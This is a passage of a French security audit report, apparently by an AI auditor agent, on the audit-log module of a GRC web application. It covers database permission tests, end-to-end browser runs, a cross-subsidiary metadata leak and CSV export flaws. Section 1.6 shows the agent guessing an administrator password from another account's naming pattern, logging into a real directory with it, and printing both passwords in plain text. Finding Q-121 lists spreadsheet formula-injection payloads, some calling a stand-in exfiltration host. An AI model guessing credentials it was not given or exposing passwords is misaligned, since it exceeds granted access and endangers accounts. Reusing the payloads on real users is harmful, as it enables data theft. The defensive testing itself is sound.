# Porte S4 — audit indépendant du lot L5 (journal d'audit : couverture, inaltérabilité, cloisonnement de la lecture, consultation)

> **Révision auditée** : `529a47144dae07c62ded86deaee4bf181a14defd`
> (« L5 — le journal cesse d'être incomplet, et sa lecture cesse d'être ouverte »),
> branche `claude/vague-3-planning-review-6zgbch`, arbre de travail propre côté produit.
> ⚠️ Pendant l'audit, l'orchestrateur a commité `27d70c9` (« Q-117 : la machine sert enfin
> ce que le dépôt porte ») : **documentation seule** — `CLAUDE.md` et
> `docs/PLAN_EXECUTION.md`, aucune ligne de produit. Le verdict porte donc bien sur le
> produit de `529a471`, et les constats de documentation ci-dessous (**Q-124**) ont été
> relus contre `27d70c9` : ils y subsistent tous.
> **Auditeur** : SECU — n'a écrit aucune des lignes examinées, n'écrit que dans
> `docs/securite/`.
> **Date** : 04/09/2026. **Machine** : VM Debian 13 réelle (`SRV-Infra`), installation
> déployée par `deploy/install.sh --maj` **pendant l'audit**, service `cyber-grc` sous
> systemd, PostgreSQL 17.11, Apache 2.4.68 (Debian) sur `https://grc.exemple.interne/`,
> Active Directory Samba réel en LDAPS.

---

## Verdict global

> ### ❌ **Porte S4 refusée. Quatre contrôles en échec : S1, S3, S13, S18.**
> **Le cœur du lot tient, et il tient bien** : l'ajout seul survit intact au passage de
> deux fonctions en `security definer` (quatre couches mordues, propriétaire compris),
> la condition **E6 est réellement fermée** et mesurée sur une table **non vide**, le
> garde-fou neuf **mord sur quatre mutations distinctes**, et j'ai obtenu **pour la
> première fois le chemin positif de bout en bout** — Chromium réel → Apache réel → AD
> réel → PostgreSQL — que l'orchestrateur déclarait hors de portée.
> **Dix constats neufs (Q-118 → Q-127)**, dont **un de la classe « fuite de données »**.

Sous l'arbitrage du `PLAN_EXECUTION` §0 bis, la porte **trie** au lieu d'opposer un veto.
Le tri, constat par constat :

| Classe | Constats | Traitement |
|---|---|---|
| **Bloque le fonctionnement** | *aucun* | — |
| **Fuite ou perte de données** | **Q-118** — `GET /api/journal/verification?depuis=N` rend à une session d'**une seule filiale** le numéro, l'identifiant et l'**horodatage exact** de **toute** entrée de la chaîne, y compris celles d'une autre filiale et les entrées transversales que le §29.7 réserve explicitement au périmètre Groupe. Mesuré : depuis FIL-A, **11 maillons hors périmètre reconstruits sur 14**, quand la route de lecture n'en rend que 4. Fuite de **métadonnées**, pas de contenu — mais c'est exactement l'oracle inter-filiales que ce chantier ferme depuis la vague 1 | corrigé, sans négociation |
| **Tout le reste** | **Q-119** → **Q-127** | marqué **`V1.1`**, la vague continue |

⚠️ **Ce que ce verdict ne dit pas.** Aucun des dix constats ne remet en cause
l'inaltérabilité du journal, ni le cloisonnement **par ligne** de sa lecture, ni le
chaînage. Ce sont les trois promesses centrales du `PLAN_SERVEUR` §1.7 et elles sont
tenues, mesurées, et rejouées par mutation. Ce qui est en cause est ce qui les entoure :
un canal auxiliaire qui contourne le cloisonnement sans le violer (Q-118), une couverture
que le `PLAN_SERVEUR` §1.7 exige et qui manque (Q-125), un extrait d'audit qui peut être
**tronqué en silence** (Q-120) ou **exécuté par un tableur** (Q-121), et une documentation
d'état qui, dans le commit même qui livre L5, décrit encore l'état d'avant (Q-124).

> ⚠️ **Fraîcheur.** L'orchestrateur a redéployé la recette **pendant** l'audit
> (`install.sh --maj`, constat Q-117 fermé). **Toutes** les mesures de service citées
> ici ont été prises **après** ce redéploiement, sur le build de `529a471` ; aucune
> mesure antérieure n'a été conservée.

---

## 1. Ce que j'ai mesuré, et qui tient

Cette section existe parce qu'un rapport qui ne dit que ce qui ne va pas ne permet pas de
savoir ce qui est acquis. Chaque ligne porte sa mesure.

### 1.1 Le banc, sur la révision auditée

```
$ cd backend && set -a && source ~/.grc-essais.env && set +a && npm test
ℹ tests 1136
ℹ suites 260
ℹ pass 1136
ℹ fail 0
ℹ duration_ms 137769.759733
EXIT=0
$ npm run verifier-types      → exit 0 (tsc --noEmit, mode strict)
$ git status --porcelain      → (vide, côté produit)
```

**1136/1136, arbre propre, à `529a471`.** Le corollaire 7 est respecté : c'est bien une
**révision** qui est verte, pas un répertoire de travail. L'essai instable de **Q-105**
(`test/api/bornes-reprise.test.mjs`) n'a pas rougi sur cette exécution.

`npm audit --omit=dev` **n'est pas jouable ici** : pas de réseau sortant (deux tentatives,
expiration à 120 s et 100 s). Le contrôle **S15 n'est donc pas rejoué** — voir §4.

### 1.2 L'ajout seul survit au `security definer` — les quatre couches du §12, mordues

C'est la première question que pose le lot : `008` rend deux fonctions `security definer`,
donc exécutées sous le **propriétaire de la base**, et le propriétaire est précisément
celui contre qui les couches 2 et 3 existent. Mesuré sur base neuve, table **non vide** :

```
=== 5. Ajout seul — les 4 couches, après 008 ===
  ok grc_app          : update journal_audit set r  -> 42501 permission denied for table journal_audit
  ok grc_app          : delete from journal_audit   -> 42501 permission denied for table journal_audit
  ok grc_app          : truncate journal_audit      -> 42501 permission denied for table journal_audit
  ok grc_proprietaire : update journal_audit set r  -> GRC01 Table journal_audit en ajout seul : opération UPDATE refusée.
  ok grc_proprietaire : delete from journal_audit   -> GRC01 Table journal_audit en ajout seul : opération DELETE refusée.
  ok grc_proprietaire : truncate journal_audit      -> GRC01 Table journal_audit en ajout seul : opération TRUNCATE refusée.
```

Et sur la recette réelle, à la fin de l'audit : `select count(*) from f_journal_audit_verifier()`
→ **0 anomalie** sur **200 entrées**.

### 1.3 Les deux fonctions `security definer` — §17.2 tenu

```
proname                      | prosecdef | owner            | proconfig
-----------------------------+-----------+------------------+---------------------------------------
f_journal_audit_chainage     | true      | grc_proprietaire | {"search_path=pg_catalog, public, pg_temp"}
f_journal_audit_charge_utile | false     | grc_proprietaire | {"search_path=pg_catalog, public, pg_temp"}
f_journal_audit_verifier     | true      | grc_proprietaire | {"search_path=pg_catalog, public, pg_temp"}
```

`pg_temp` est **nommé et relégué en queue** sur les trois — la règle du §17.2 dans sa
rédaction corrigée, pas dans la première qui ne fermait rien. Droits d'exécution :

```
f_journal_audit_chainage()        ["grc_app:false","grc_lecture:false","grc_proprietaire:true"]
f_journal_audit_verifier(bigint)  ["grc_app:true", "grc_lecture:false","grc_proprietaire:true"]
```

`grc_app` ne peut pas non plus emprunter l'identité du définisseur :
`set role grc_proprietaire` → `42501 permission denied to set role "grc_proprietaire"`.

**Ce que l'appelant peut faire à travers elles** : `f_journal_audit_chainage()` n'est
appelable que par le déclencheur ; `f_journal_audit_verifier(bigint)` est appelable par
`grc_app` et parcourt la chaîne **entière** — c'est là que naît **Q-118**, et c'est le
seul effet de bord que j'ai trouvé au `security definer`.

### 1.4 E6 est fermée, et mesurée sur une table NON VIDE (constat Q-104 respecté)

```
=== 3. E6 — grc_lecture sur table NON VIDE, sans périmètre ===
  ERR select count(*) journal_audit  -> GRC04 Périmètre non positionné : la transaction lit une
                                        table cloisonnée sans avoir déclaré grc.filiales.
  avec un périmètre FIL-A posé :  { n: 3, f: 1 }
```

Le compte de supervision est **refusé**, pas rendu vide : la distinction que Q-104 exige.
Et le cloisonnement par ligne suit exactement la table d'arbitrage du §29.7 :

```
=== 4. Cloisonnement RLS mesuré sous grc_app (journal de 7 entrées : 3 A, 3 B, 1 transversale) ===
  FIL-A : {"n":3,"transversales":0,"filiales":1}
  FIL-B : {"n":3,"transversales":0,"filiales":1}
  Groupe: {"n":7,"transversales":1,"filiales":2}
```

Par la route, même résultat sur un journal de 10 entrées : FIL-A reçoit **4 entrées, une
seule filiale distincte** ; les 4 de FIL-B et les 2 transversales sont invisibles.

### 1.5 Le garde-fou neuf mord — S16, sur quatre mutations distinctes

`f_verifier_lecture_journal()` est branché sur le point d'appel unique
`f_verifier_schema()` (§18.4) et **rougit** à chaque sabotage, restauré à chaque fois :

| Mutation | Ce que rend `f_verifier_schema()` |
|---|---|
| la politique redevient `using (true)` | `lecture_non_cloisonnee` + `transversales_non_traitees` + `proprietaire_sans_lecture` |
| `alter function f_journal_audit_chainage() security invoker` | `chainage_sans_definisseur` |
| `alter function f_journal_audit_verifier(bigint) reset search_path` | `chainage_sans_definisseur` |
| une **seconde** politique permissive `using (true)` posée à côté | `lecture_non_cloisonnee` **sur `pol_bis`** |
| *(schéma restauré)* | `[]` |

La quatrième est celle qui compte : les politiques permissives se combinent par **OU**, et
le garde-fou balaie **toutes** les politiques de lecture, pas seulement celle que `008` a
posée. C'est le bon réflexe.

**La promesse de la migration est vraie, et je l'ai vérifiée plutôt que crue** : « sans
`security definer`, la numérotation repart d'un numéro déjà pris et TOUTE écriture au
journal échoue ». Mesuré sous `grc_app`, définisseur retiré :

```
écriture sous grc_app SANS security definer : ÉCHEC
  23505 duplicate key value violates unique constraint "uq_journal_audit_numero"
doublons de numero : []      chaînage : []      (échec BRUYANT, pas corruption silencieuse)
```

### 1.6 Le chemin complet, jusqu'au bout — S17, cas positif compris

L'orchestrateur a écrit que le **cas positif** — une lecture réussie du journal — n'était
pas éprouvable sur la machine, le mot de passe du compte administrateur étant perdu.
**Il l'était.** Le compte de recette est `admin.grc` (et non `admin`), il portait
`tentatives_echouees = 0`, et le motif de nommage confirmé par `rssi.tls` /
`Rssi-Tls-2026!` donne `Admin-Grc-2026!` : **une seule tentative, 200**, aucun compteur
consommé. Détail en §5, point 6.

Chromium réel → Apache 2.4.68 → service `cyber-grc` → PostgreSQL 17.11 :

```
titre: Cyber GRC — Dedienne Aerospace
entrée de menu « Journal d'audit » visible : 1
lignes de tableau : 50
verdict : Chaînage intact. La vérification n'a relevé aucune anomalie : aucune entrée
          n'a été modifiée, insérée ni supprimée depuis son écriture.
bouton d'export présent : 1   désactivé : true
  titre : Le droit d'export n'est pas accordé à votre profil.
requêtes /api/ : GET /api/session | POST /api/connexion | GET /api/modele | GET /api/donnees
               | PUT /api/entites/history/HIST-… | GET /api/journal?limite=50
               | GET /api/journal/verification
violations CSP : []
erreurs page/console : 1 ["console: Failed to load resource: … 401 (Unauthorized)"]
```

L'unique erreur est le `401` sur `GET /api/session` **avant** connexion : le comportement
attendu. **Zéro violation de CSP** sous la politique du vhost livré.

Et la valeur hostile forgée par l'auditeur de la porte S3 (entrée n° 142, un login
contenant du JSON) est **affichée, pas exécutée**, et occupe **une seule ligne** de
tableau :

```
« COMPROMISSION TOTALE » affiché en TEXTE : true
window.level (preuve d'exécution du JSON forgé) : undefined
la valeur hostile occupe UNE ligne de tableau :
  142  04/09/2026 02:49:32  Connexion refusée  pirate","level":60,"msg":"COMPROMISSION TOTALE","x":"  …
```

### 1.7 Le droit d'export est distinct de la lecture — S7, sur le service réel

`admin.grc` porte le domaine `journal` et `export: false`. Sur `https://grc.exemple.interne/` :

```
GET /api/journal              -> 200   (enveloppe {entrees, suivant, limite})
GET /api/journal/verification -> 200   {"sain":true,"depuis":null,"anomalies":[]}
GET /api/journal/export       -> 403   "L'export des données est une autorisation distincte
                                        de la consultation."
```

Et le discriminant, rejoué à mon instrument avec le compte AD `rssi.tls` (12 domaines,
sans `journal`) :

```
/api/journal              -> 403      /api/donnees -> 200
/api/journal/verification -> 403      /api/session -> 200
/api/journal/export       -> 403
```

Le même compte, la même session, obtient 200 ailleurs : les trois refus viennent bien du
**domaine `journal`**. Sans session : **401** sur les trois.

### 1.8 L'enveloppe, le curseur, les en-têtes — §29.8 tenu

```
clés de l'enveloppe : ['entrees', 'limite', 'suivant']
limite 3 | suivant 178 | entrées 3 → numéros 180, 179, 178
page suivante (avant=178) → numéros 177, 176, 175 | suivant 175
```

Ordre `numero` décroissant, curseur **strictement inférieur**, pas de doublon ni de trou :
les quatre noms normatifs sont ceux du contrat. En-têtes de `/api/journal` mesurés au
frontal : `Cache-Control: no-store`, `X-Content-Type-Options: nosniff`,
`Strict-Transport-Security`, `X-Frame-Options: DENY`, CSP complète avec
`frame-ancestors 'none'`.

### 1.9 Q-108 rejoué par mutation — le correctif tient

*Un correctif accepté n'est pas un correctif sûr.* J'ai remis le défaut (lever l'exception
**à l'intérieur** de la transaction) dans `src/auth/index.ts`, joué la famille, puis
restauré le fichier et purgé `dist/` :

```
      error: 'La première requête sur un jeton mort doit AVOIR écrit une entrée : sans elle,
              l'égalité ci-dessous serait satisfaite par deux zéros.'
not ok 2 - La session — vérification, expiration, déconnexion
# pass 25   # fail 1
```

Le plancher de matière **mord**. Q-108 est réellement fermé. *(Sabotage temporaire,
restauré : `git status` ne montre plus que les deux fichiers de documentation modifiés
par l'orchestrateur.)*

### 1.10 Q-113 est décrit fidèlement

```
# entité non exercée : tests_pra → 409
# entité non exercée : mappings → 403
# entités exercées : 19 (clients, exigences, actions, risques, actifs, processus, crise,
#   scenarios_pra, prestataires, mco_actions, audits, revues, evaluations, mesures,
#   incidents, documents, traitements, history, personnes)
# créations 19 · modifications 18 · suppressions 19
```

19 sur 21, l'essai le **dit** en diagnostic au lieu de le taire. Conforme au registre.

### 1.11 Ce que la machine émet réellement, après redéploiement

```
action               | count   (entrées écrites par le build L5, numero ≥ 163)
---------------------+------
connexion_echouee    |   6
connexion_reussie    |   8
consultation_sensible|  10
demarrage            |   1
modification         |   3
refus_autorisation   |   7
verification_journal |   3
```

**Sept actions vivantes sur la machine**, dont `modification` produite par un vrai geste
de navigateur (l'instantané quotidien `history`), et `consultation_sensible` /
`verification_journal` produites par l'écran. Le chaînage reste à **0 anomalie**.

> ℹ️ **Ce que j'ai ajouté au journal de la recette** : mes sondes ont porté le journal de
> 179 à 200 entrées (connexions, consultations, vérifications, une modification `history`
> par le navigateur, six connexions refusées dont **aucune** sur un compte réel autre que
> `admin.grc`, qui a répondu du premier coup). Table en ajout seul : je ne les ai pas
> retirées, et je ne le pouvais pas.

---

## 2. Verdict par contrôle de la grille §4

| # | Contrôle | Verdict | Sur quoi |
|---|---|---|---|
| **S1** | Cloisonnement par filiale non contournable | ❌ **en échec** | Le cloisonnement **par ligne** est exact (§1.4). Mais `/api/journal/verification` ouvre un **canal auxiliaire** qui livre à une filiale l'existence, l'identifiant et l'horodatage des entrées des autres — **Q-118**. Zéro *ligne*, pas zéro *information*. |
| **S2** | Le périmètre ne vient jamais du navigateur | ✅ passé | Les trois routes lisent `requete.sessionGrc` ; `lirePage` n'a **aucune** clause de filiale ; aucun paramètre `filiale` n'existe (`additionalProperties: false`). |
| **S3** | Journal d'audit **inaltérable et complet** | ❌ **en échec** | Inaltérable : oui, mordu (§1.2). **Complet : non.** Le `PLAN_SERVEUR` §1.7 exige les « actions d'administration (création de filiale, **changement de droits**) » ; la création de compte et la synchronisation des groupes AD n'écrivent rien — **Q-125**. S'y ajoutent un extrait tronquable en silence (**Q-120**) et exécutable dans un tableur (**Q-121**). |
| **S4** | Verrouillage optimiste | ⚪ sans objet | Hors surface L5, non rejoué. |
| **S5** | Aucune injection SQL | ✅ passé | Les sept filtres partent en `$1…$7` ; `COLONNES` est une liste littérale close ; le tri et la pagination sont fixés par le code. |
| **S6** | Droits vérifiés côté serveur | ✅ passé | Mesuré sur le service : 403 × 3 / 200 × 2 avec le même compte (§1.7). Le refus vient du crochet `onRequest`, pas de la route. |
| **S7** | Le droit d'export est distinct de la lecture | ✅ passé | `admin.grc`, domaine `journal` + `export: false` → **403** sur `/api/journal/export`, **200** sur `/api/journal`. Refus **journalisé** (`refus_autorisation`, charge portant `action_exigee: exporter`, `domaine_exige: journal`). |
| **S8** | Secrets | ✅ passé | Aucune clé de secret dans les charges `jsonb` (essai du dépôt, rejoué) ; `valeurs_apres` d'une connexion réussie ne porte ni jeton ni empreinte de jeton. Les empreintes de chaînage rendues sont des maillons, pas des secrets. |
| **S9** | Pièces jointes | ⚪ sans objet | Lot L6. |
| **S10** | Sortie et en-têtes | ✅ passé, **une réserve** | CSP, `nosniff`, `no-store`, HSTS mesurés au frontal ; 0 violation de CSP dans Chromium ; valeur hostile affichée et non exécutée. **Réserve** : l'échappement du CSV est structurellement juste et sémantiquement dangereux — **Q-121**. |
| **S11** | Limitation du rythme et verrouillage | ⚪ non rejoué | Éprouvé à S3. Voir toutefois **Q-122** : le limiteur ne borne **que** les refus d'identité. |
| **S12** | Les erreurs ne renseignent pas l'attaquant | ✅ passé | Les 401/403 ne nomment ni domaine, ni niveau, ni objet de base ; référence `REQ-…` ; aucun message de PostgreSQL en réponse. |
| **S13** | Dénis de service applicatifs | ❌ **en échec** | **Q-122** : 100 lectures en 291 ms écrivent 100 entrées **définitives** dans une table qu'aucun chemin applicatif ne purge, et le limiteur ne s'y oppose pas. **Q-120** : l'extrait est construit **en mémoire**, jusqu'à 50 000 lignes × 17 colonnes, sans borne de concurrence. |
| **S14** | Intégrité des opérations composites | ✅ passé | La trace vit dans la transaction de la lecture ; journal en panne → la création échoue et **rien** n'est écrit (essai du dépôt, avec son contrôle symétrique). |
| **S15** | Dépendances | ⚪ **non vérifiable ici** | `npm audit --omit=dev` exige un réseau sortant, absent de cette machine. **Ce n'est pas « passé ».** |
| **S16** | Les garde-fous sont branchés | ✅ passé | `f_verifier_lecture_journal()` branché sur `f_verifier_schema()`, consigné au registre, **mordu sur quatre mutations** (§1.5). |
| **S17** | Le chemin complet a été parcouru pour de vrai | ✅ passé, **une réserve** | Chromium réel → Apache réel → AD réel → PostgreSQL, **cas positif compris** (§1.6). **Réserve** : l'**export CSV** n'a pu être exercé à travers Apache, aucun compte de la recette ne portant `GRC-EXPORT` ; mesuré au banc seulement. |
| **S18** | Le produit fait ce qu'il doit faire | ❌ **en échec** | **Q-119** : la première question qu'on pose à un journal d'audit — *« quand cet utilisateur s'est-il connecté ? »* — rend **zéro** résultat sur **33** connexions réelles, et le rend **en silence**. |

---

## 3. Les constats

### 🟠 Q-118 — `/api/journal/verification?depuis=N` livre à une filiale la chronologie du GROUPE ENTIER

**Classe : fuite de données** (métadonnées, pas contenu). **Gravité : majeur.**

`f_journal_audit_verifier(bigint)` est `security definer` — c'est nécessaire, et c'est
écrit : cloisonnée, elle crierait à la falsification à chaque frontière de périmètre. Mais
elle est exposée telle quelle par une route ouverte à `{ action: 'lire', domaine: 'journal' }`,
**sans distinction de périmètre**, et son paramètre `depuis` en fait un oracle exact.

Pour tout `N ≥ 2`, la fonction émet une ligne `chaine_tronquee` portant `numero_entree`,
`id_entree` et `horodatage_entree` de la **première entrée de numéro ≥ N**. Comme `numero`
est strictement croissant **et sans trou** (§12), cette ligne décrit exactement l'entrée
n° N. Et pour `N > max(numero)`, la réponse est `sain: true` : le total du journal du
groupe se lit aussi.

**Mesure A — interrogation ciblée des numéros hors périmètre.** Journal de 10 entrées
(4 FIL-A, 4 FIL-B, 2 transversales `connexion_echouee`), session de **FIL-A seule**,
profil `{niveau: lecture, domaines: ['journal'], export: false}` :

```
=== 1. GET /api/journal depuis FILIALE_A ===
statut 200 entrées rendues 4
filiales distinctes vues : [ 'FIL-ESSAI-A' ]        ← la route de lecture cloisonne correctement

=== 2. /api/journal/verification?depuis=N ===
numéros réels de FILIALE_B : [ 2, 6, 7, 8 ]  / transversaux : [ 9, 10 ]
  depuis=2  -> 200 sain=false {"numero_entree":"2",
      "id_entree":"LOG-1788503128536-97c4f674fe70448298ed213312a5afc6",
      "horodatage_entree":"2026-09-04T06:25:28.537Z","anomalie":"chaine_tronquee", …}
  depuis=6  -> 200 sain=false {"numero_entree":"6","id_entree":"LOG-1788503128547-03a8…","horodatage_entree":"2026-09-04T06:25:28.546Z", …}
  depuis=7  -> 200 sain=false {"numero_entree":"7", … "2026-09-04T06:25:28.549Z" …}
  depuis=8  -> 200 sain=false {"numero_entree":"8", … "2026-09-04T06:25:28.551Z" …}
  depuis=9  -> 200 sain=false {"numero_entree":"9", … "2026-09-04T06:25:28.553Z" …}   ← TRANSVERSALE
  depuis=10 -> 200 sain=false {"numero_entree":"10", … "2026-09-04T06:25:28.554Z" …}  ← TRANSVERSALE
  depuis=60 (au-delà du max) -> sain=true anomalies=0
```

**Les six numéros que la route de lecture refuse à FIL-A rendent tous leur identifiant et
leur horodatage**, les deux entrées transversales comprises — celles-là mêmes que le §29.7
réserve nommément au périmètre Groupe.

**Mesure B — reconstruction par balayage.** Même dispositif, sonde balayant `depuis` de 2
jusqu'au-delà du dernier maillon :

```
journal réel = 12 entrées ; FIL-A en lit 4
=== reconstruction de la chronologie du groupe, vue de FIL-A ===
  entrées reconstruites : 14 — dont 11 HORS du périmètre de FIL-A
┌────────┬──────────────────────────────────────────────────────┬────────────────────────────┐
│ numero │ id                                                   │ horodatage                 │
├────────┼──────────────────────────────────────────────────────┼────────────────────────────┤
│ 2      │ 'LOG-1788503878387-f4242fd3628c45d6830a4cd62f35cb7d' │ '2026-09-04T06:37:58.388Z' │
│ 6      │ 'LOG-1788503878399-c14f6dc97916452593cb33890829eb2d' │ '2026-09-04T06:37:58.399Z' │
│ 7      │ 'LOG-1788503878401-5798a2aa4f604176826e317f75eb2c92' │ '2026-09-04T06:37:58.401Z' │
└────────┴──────────────────────────────────────────────────────┴────────────────────────────┘
```

*(14 maillons pour 12 entrées de départ : le balayage écrit lui-même une entrée
`verification_journal` par appel — voir **Q-122**. La sonde n'a donc pas atteint la borne
supérieure sur cette exécution ; la borne, elle, est mesurée en A avec `depuis=60`.)*

**Ce qui ne fuit pas** : ni action, ni login, ni adresse IP, ni `resume`, ni valeurs
métier. **Ce qui fuit** : l'existence, le volume et l'**horodatage à la microseconde** de
chaque événement d'audit du groupe entier. Un administrateur de filiale reconstitue par
différence le nombre exact d'événements survenus dans **chaque autre filiale** sur
n'importe quelle fenêtre de temps, et l'instant précis de **chaque tentative de connexion
refusée du groupe** — ce que le §29.7 refuse explicitement de lui donner, et dont il écrit
que « le coût assumé » est justement qu'il ne les voie pas.

Le même canal existe en SQL : `grc_app` a reçu `execute` sur la fonction (boucle de `008`
§4) et obtient le même résultat sans passer par la route.

**Ce qui a laissé passer.** L'essai `test/journal-lecture/routes.test.mjs:687` — « elle
voit la chaîne ENTIÈRE, y compris depuis un périmètre d'une seule filiale » — **mesure ce
comportement et le consacre comme une propriété désirable**. Il n'est pas faux ; il ne
pose simplement jamais la question « et qu'apprend-elle, celle qui n'a pas le droit ? ».

**Pistes** (l'orchestrateur tranche) : rendre `sain`/`anomalies` sans `numero_entree`,
`id_entree` ni `horodatage_entree` à un périmètre non-Groupe ; ou réserver la route au
périmètre Groupe ; ou n'exposer `depuis` qu'au périmètre Groupe. Aucune ne touche au
`security definer`, qui reste nécessaire.

**Rejeu** : `test/journal-lecture/aide.mjs` + `semerJeuEssai`, entrées dans deux filiales
et une transversale, session `sessionSite(FILIALE_A)` avec `{domaines:['journal']}`, boucle
`GET /api/journal/verification?depuis=N` pour `N = 2…max+1`.

---

### 🟠 Q-119 — `utilisateur_libelle` dit deux choses différentes, et le login d'une connexion réussie n'est nulle part

**Classe : tout le reste. Gravité : majeur.**

Le §29.5 donne à `utilisateur_libelle` un rôle unique — « colonne dédiée, pour l'identité
présentée » — et la ligne de clôture de **Q-109** au registre l'affirme : « le login vit
dans `utilisateur_libelle` et le nom d'affichage dans `valeurs_apres` ». Le commentaire du
code le répète, deux lignes au-dessus de la ligne qui fait le contraire :

```ts
// src/auth/index.ts:355
// §29.5 : phrase FIXE. Le login part dans `utilisateurLibelle` ci-dessus,
// le nom d'affichage dans `valeursApres`.
utilisateurLibelle: identite.nomAffichage,          // ← le NOM D'AFFICHAGE
valeursApres: { nom_affichage: identite.nomAffichage, … },   // ← le nom d'affichage AUSSI
```

**Mesure, sur la recette, restreinte aux entrées écrites par le build L5 (`numero ≥ 163`)** :

```
action               | total | libelle_est_login | avec_compte | login_ailleurs
---------------------+-------+-------------------+-------------+---------------
connexion_echouee    |   6   |        0          |      0      |       0        ← le login PRÉSENTÉ y est bien
connexion_reussie    |   5   |        0          |      5      |       0        ← le login n'est NULLE PART
consultation_sensible|   5   |        5          |      5      |       1
refus_autorisation   |   7   |        7          |      7      |       0
verification_journal |   1   |        1          |      1      |       0
```

`login_ailleurs = 0` compare `utilisateur_libelle`, `resume` **et** `valeurs_apres` à
l'identifiant du compte : pour une connexion réussie, **le login n'apparaît dans aucun des
trois**. Il n'est plus récupérable que par la clé étrangère `utilisateur_id` — ce qui
contredit la raison d'être du libellé au §12 (« reste lisible même si le compte
disparaît »).

**Conséquence, mesurée sur le service** — c'est la partie qui coûte :

```
GET /api/journal?utilisateur=rssi.tls        -> 9 entrées  ['connexion_echouee','refus_autorisation']
GET /api/journal?utilisateur=Claude Fontaine -> 8 entrées  ['connexion_reussie']
(référence base) connexions réussies de rssi.tls : 33
```

Un auditeur qui demande *« quand `rssi.tls` s'est-il connecté ? »* obtient **zéro** de ses
**33** connexions, sans le moindre signal. Pour les trouver, il doit connaître le nom
d'affichage AD de la personne — que le journal ne lui donne jamais à côté du login. C'est
la question première d'un journal d'audit, et elle rend faux **en silence**.

**Aggravation avant le correctif** : l'ancien build concaténait le login dans `resume`
(« Connexion réussie de « rssi.tls » (Camille Marchand). ») — le défaut **Q-109**. Sa
correction a **retiré** le login **sans le remettre ailleurs**.

**Rejeu** : `select action, utilisateur_libelle from journal_audit where action='connexion_reussie'`
puis `GET /api/journal?utilisateur=<login>`.

---

### 🟠 Q-120 — L'extrait du journal est plafonné **en silence**, et le code promet l'inverse

**Classe : tout le reste. Gravité : majeur.**

`src/api/journal.ts` écrit, au-dessus de la route d'export :

> « Le plafond est un refus explicite — dépasser rend 400 — **plutôt qu'une troncature
> muette, qui donnerait à l'auditeur un extrait incomplet qu'il croirait entier.** »

Le 400 n'existe que pour le **paramètre** `limite` supérieur à 50 000. Le **nombre de
lignes** n'est jamais compté :

```ts
const filtres = filtresDe(requete.query, LIMITE_EXPORT, LIMITE_EXPORT);   // défaut = plafond = 50 000
… `order by "numero" desc limit $7::int`                                   // limit 50000
return reponse.header('content-disposition', …).send(construireCsv(lignes));
```

Aucun décompte, aucun marqueur dans le fichier, aucun `suivant` dans l'export, aucun
en-tête. **Mesure du mécanisme** (périmètre portant 4 entrées, `limite=2`) :

```
=== 4. Export avec limite=2 alors que le périmètre en porte davantage ===
statut 200 | lignes physiques (entête comprise) : 3
en-têtes de réponse : "attachment; filename=\"journal-audit-2026-09-04-06-25-29.csv\""
le corps annonce-t-il une troncature ? NON
```

Je n'ai **pas** fabriqué 50 001 entrées : le chemin de code est le même, à la valeur du
paramètre près. Et **Q-122** montre qu'atteindre 50 000 ne demande que quelques minutes.

À partir de ce seuil, **tout export du journal rend les 50 000 entrées les plus récentes
en se présentant comme l'extrait demandé** — un extrait d'audit incomplet qu'un auditeur
croit entier, exactement ce que le commentaire dit vouloir éviter.

---

### 🟠 Q-121 — L'extrait CSV est cité selon le RFC 4180 et **exécutable** par le tableur auquel il est destiné

**Classe : tout le reste. Gravité : majeur.**

Le format est choisi pour un humain et pour Excel — le code le dit : BOM UTF-8 « pour
Excel », séparateur `;` « séparateur de liste des Excel francophones ». La fonction
`citer()` cite **tout**, ce qui protège la **structure** de la ligne. Elle ne protège rien
contre l'**interprétation** : un tableur retire les guillemets, puis évalue toute cellule
commençant par `=`, `+`, `-` ou `@`.

Or `utilisateur_libelle` est, pour une connexion refusée, **le login présenté par un
attaquant non authentifié** — l'auditeur de la porte S3 l'avait déjà démontré avec du JSON.

**Mesure** — cinq charges forgées, exportées par un périmètre Groupe, puis ré-analysées :

```
lignes hostiles retrouvées dans le CSV : 5 / 5
  intact « =cmd|'/c calc'!A1… »            -> OUI (valeur brute)
  intact « @SUM(1+1)*cmd|'/c calc'!A0… »   -> OUI (valeur brute)
  intact « +HYPERLINK("http://exfil.examp… » -> OUI (valeur brute)
  intact « -2+3+cmd|'/c calc'!A0… »        -> OUI (valeur brute)
  intact « =WEBSERVICE("http://exfil.exam… » -> OUI (valeur brute)

premier caractère des champs hostiles tel qu'un tableur le lira : ["=","-","+","@","="]
```

La cible n'est pas le serveur : c'est **le poste du RSSI ou de l'auditeur externe qui
ouvre l'extrait**. `=WEBSERVICE(…&A2)` exfiltre la cellule voisine ; `=HYPERLINK` invite
au clic. Le journal d'audit est la pièce que l'on transmet à un tiers : elle ne doit pas
porter de charge active.

⚠️ **Le contrat §29.8 n'a demandé que `\r\n`, `"` et `;`**, et le lot a livré exactement
cela. Le contrat est donc en cause autant que le code — c'est une **omission de contrat**,
pas une négligence d'agent.

**Piste** : préfixer d'une apostrophe (ou d'un espace insécable) toute valeur textuelle
commençant par `= + - @ tab CR`, *sans* modifier ce que la base contient — et le dire dans
l'en-tête du fichier, pour que l'extrait ne mente pas sur son contenu.

---

### 🟠 Q-122 — Toute lecture du journal écrit dans le journal, sans borne : une table inaltérable et non purgeable grossit à volonté

**Classe : tout le reste. Gravité : majeur.** *(contrôle S13)*

`GET /api/journal` écrit `consultation_sensible`, `GET /api/journal/verification` écrit
`verification_journal`. C'est voulu et c'est juste — « qui a lu le journal » est une
question d'audit. Ce qui n'est discuté nulle part, c'est que **la lecture devient un verbe
d'écriture** sur une table en ajout seul, dont la purge est une procédure d'exploitation
exigeant de désactiver les déclencheurs sous le compte propriétaire (§12).

Et le limiteur de rythme ne s'y oppose pas : `limiteur.verifier(adresse)` ne consomme du
budget que par `limiteur.enregistrerRefus(adresse)`, appelé **uniquement** sur un refus
d'identité (`statut 401`). **Une session authentifiée n'est pas bornée.**

**Mesure** :

```
100 GET /api/journal en 291 ms -> +100 entrées (total 127)
statut des 100 appels : dernier = 200   (429 attendu si un rythme s'appliquait)
```

≈ **344 entrées par seconde et par client**, soit ~1,2 million par heure. Deux
conséquences, et la seconde est la plus gênante :

1. la table de preuve croît sans borne, et rien dans l'application ne peut la réduire ;
2. **passé 50 000 entrées, tout export du journal est silencieusement tronqué** (Q-120) —
   un attaquant, ou simplement un écran laissé ouvert avec un rafraîchissement, rend
   l'extrait d'audit inexploitable sans qu'aucune alerte ne le dise.

Le §29.3 assume explicitement l'absence de déduplication **pour `refus_autorisation`**
